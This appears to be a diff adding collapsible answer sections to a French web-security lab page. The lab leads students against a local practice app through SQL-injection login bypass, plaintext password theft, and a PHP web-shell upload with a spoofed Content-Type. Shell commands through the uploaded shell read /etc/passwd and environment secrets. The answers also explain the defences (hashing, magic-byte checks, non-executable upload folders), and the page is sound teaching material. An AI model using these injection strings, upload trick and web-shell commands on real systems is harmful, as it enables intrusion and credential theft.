@@ -26,6 +26,22 @@ pre code{background:none;padding:0;color:inherit}
 .step{border-left:4px solid #8b1a1a;background:#fff;border:1px solid #f0d8dd;border-radius:8px;padding:4px 18px 14px;margin:18px 0}
 .livrable{background:#fff7e6;border:1px solid #ffe2a8;border-radius:8px;padding:14px 18px;margin-top:12px}
 ul.clean{padding-left:20px}footer.doc{text-align:center;color:#8a8f98;font-size:13px;margin-top:50px}
+/* Corrections repliables (masquées par défaut) */
+details.solution{background:#fff;border:1px solid #cfe8d8;border-left:4px solid var(--ok);border-radius:8px;margin:10px 0 18px}
+details.solution>summary{cursor:pointer;padding:10px 16px;font-weight:700;color:var(--ok);list-style:none;user-select:none}
+details.solution>summary::-webkit-details-marker{display:none}
+details.solution>summary::before{content:"\25B6";display:inline-block;margin-right:.6rem;font-size:.75em;transition:transform .2s}
+details.solution[open]>summary::before{transform:rotate(90deg)}
+details.solution>summary:hover{color:#146c3f}
+.solution-body{padding:4px 18px 16px;border-top:1px solid #e3efe7}
+.solution-body>*:first-child{margin-top:0}
+.solution-body h4{color:var(--accent);margin:14px 0 4px;font-size:14px}
+.toolbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap;background:#eef3fb;border:1px solid #d9e4f5;border-radius:8px;padding:8px 14px;margin:18px 0}
+.toolbar span{color:#555;font-size:13px;margin-right:auto}
+.toolbar button{background:#fff;border:1px solid #c7d3e6;color:var(--accent2);padding:5px 12px;border-radius:6px;cursor:pointer;font:inherit;font-size:13px}
+.toolbar button:hover{border-color:var(--ok);color:var(--ok)}
+.theorie{border-left:4px solid #6b4fbb;background:#f1edfb;padding:12px 16px;border-radius:6px;margin:14px 0}
+.theorie h4{color:#4b3a86;margin:12px 0 4px;font-size:14px}.theorie>*:first-child{margin-top:0}
 </style></head>
 <body>
 <header class="doc"><div class="wrap" style="padding:0">
@@ -39,6 +55,12 @@ ul.clean{padding-left:20px}footer.doc{text-align:center;color:#8a8f98;font-size:
 
 <div class="obj"><strong>Objectif pédagogique</strong>
 <p style="margin:.4em 0">Ne pas (encore) apprendre à défendre, mais <strong>voir de ses yeux</strong> ce que veut dire « une appli est compromise » : partir d'un simple champ de login et finir avec un <strong>shell sur le serveur</strong>. Chaque étape ouvre la suivante.</p>
+</div>
+
+<div class="toolbar">
+  <span>Les corrections sont masquées. Cherche d'abord, puis déplie.</span>
+  <button onclick="document.querySelectorAll('details.solution').forEach(d=>d.open=true)">Tout afficher</button>
+  <button onclick="document.querySelectorAll('details.solution').forEach(d=>d.open=false)">Tout masquer</button>
 </div>
 
 <h2>Mise en route</h2>
@@ -65,6 +87,14 @@ ul.clean{padding-left:20px}footer.doc{text-align:center;color:#8a8f98;font-size:
 <pre><code>SELECT * FROM users WHERE username = 'admin'-- -' AND password = '...'</code></pre>
 <p>Vous êtes connecté en <strong>admin</strong>, sans jamais avoir connu son mot de passe.</p>
 <div class="livrable"><strong>Q1.</strong> Expliquez avec vos mots pourquoi <code>admin'-- -</code> fonctionne. Que se passerait-il avec <code>' OR '1'='1</code> ?</div>
+<details class="solution"><summary>Correction 1</summary><div class="solution-body">
+<h4>Ce que devient la requête</h4>
+<p>L'apostrophe de <code>admin'</code> ferme la chaîne du nom d'utilisateur. Le <code>-- </code> (avec l'espace) ouvre un commentaire SQL : tout ce qui suit, dont la vérification du mot de passe, est ignoré. La requête se réduit à :</p>
+<pre><code>SELECT * FROM users WHERE username = 'admin'</code></pre>
+<p>Elle renvoie la ligne <code>admin</code> et l'appli considère la connexion réussie, sans jamais contrôler le mot de passe.</p>
+<h4>Variante <code>' OR '1'='1</code></h4>
+<p>La condition <code>'1'='1'</code> est toujours vraie : la requête renvoie au moins une ligne, souvent le premier utilisateur (c'est-à-dire l'admin). On entre là aussi sans connaître aucun mot de passe.</p>
+</div></details>
 </div>
 
 <div class="step">
@@ -72,6 +102,12 @@ ul.clean{padding-left:20px}footer.doc{text-align:center;color:#8a8f98;font-size:
 <p>Le tableau de bord administrateur affiche tous les comptes… avec leurs mots de passe <strong>en clair</strong>. Vous repartez avec le mot de passe réel de l'admin et de tous les utilisateurs.</p>
 <div class="note">Deux fautes se cumulent : l'injection SQL (entrer sans autorisation) <em>et</em> le stockage des mots de passe en clair (une fois dedans, tout est exposé). Dans la vraie vie, c'est comme ça que des bases entières fuitent.</div>
 <div class="livrable"><strong>Q2.</strong> Notez le mot de passe de <code>admin</code>. Pourquoi stocker les mots de passe en clair aggrave-t-il énormément la fuite ?</div>
+<details class="solution"><summary>Correction 2</summary><div class="solution-body">
+<h4>Mot de passe récupéré</h4>
+<p>Le dashboard admin liste les comptes et leurs mots de passe en clair : <code>admin / S3cr3t-Adm1n-2024!</code>.</p>
+<h4>Pourquoi le stockage en clair aggrave tout</h4>
+<p>Une fois la base lue (via SQLi, une sauvegarde ou un log), tous les mots de passe sont immédiatement utilisables, et souvent réutilisés par les utilisateurs sur d'autres services (credential stuffing). Hachés et salés avec bcrypt ou argon2, ils resteraient coûteux à exploiter même exfiltrés.</p>
+</div></details>
 </div>
 
 <div class="step">
@@ -92,6 +128,12 @@ curl -b c.txt -F "image=@shell.php;type=image/png" http://localhost:8080/admin.p
 # -&gt; "Visuel enregistré : uploads/shell.php"</code></pre>
 <div class="note"><strong>Sous Windows</strong>, le <code>curl</code> intégré a un bug sur l'upload de fichier (<code>-F</code>) : utilise <code>.\exploit.ps1</code> (fourni), ou <strong>Burp Suite</strong> - uploade une vraie image via le formulaire, intercepte la requête, remplace le nom par <code>shell.php</code>, le contenu par le code PHP, et force <code>Content-Type: image/png</code>. Même résultat.</div>
 <div class="livrable"><strong>Q3.</strong> Le filtre « n'autorise que les images » : pourquoi est-il inutile ? Qui contrôle le <code>Content-Type</code> ?</div>
+<details class="solution"><summary>Correction 3</summary><div class="solution-body">
+<h4>Qui contrôle le <code>Content-Type</code></h4>
+<p>Le <code>Content-Type</code> est envoyé par le client : il se falsifie en une ligne (<code>;type=image/png</code>). Un filtre qui ne regarde que cette étiquette ne vérifie rien du tout, puisque c'est l'attaquant lui-même qui l'écrit.</p>
+<h4>Ce qu'il faudrait</h4>
+<p>Valider le <strong>contenu réel</strong> du fichier (magic bytes), imposer une liste blanche d'extensions, renommer le fichier, et surtout interdire l'exécution de code dans le dossier d'upload.</p>
+</div></details>
 </div>
 
 <div class="step">
@@ -104,6 +146,14 @@ curl "http://localhost:8080/uploads/shell.php?cmd=whoami;hostname"
 curl "http://localhost:8080/uploads/shell.php?cmd=cat%20/etc/passwd"</code></pre>
 <p>Ou directement dans le navigateur : <code>http://localhost:8080/uploads/shell.php?cmd=ls%20-la</code>.</p>
 <div class="livrable"><strong>Q4.</strong> Listez 3 commandes qui montrent que vous « tenez » la machine (lecture de fichiers, utilisateurs, réseau…). Qu'est-ce qu'un attaquant ferait ensuite ?</div>
+<details class="solution"><summary>Correction 4</summary><div class="solution-body">
+<h4>Trois commandes qui prouvent le contrôle</h4>
+<pre><code>cmd=cat%20/etc/passwd      # lecture de fichiers du serveur
+cmd=whoami;hostname        # identité et nom de la machine
+cmd=env                    # variables d'environnement (secrets éventuels)</code></pre>
+<h4>Ce que fait l'attaquant ensuite</h4>
+<p>Il installe une persistance, pivote vers le réseau interne, exfiltre les données, puis cherche à élever ses privilèges (passer de <code>www-data</code> à <code>root</code>).</p>
+</div></details>
 </div>
 
 <h2>Ce que vous venez de faire</h2>
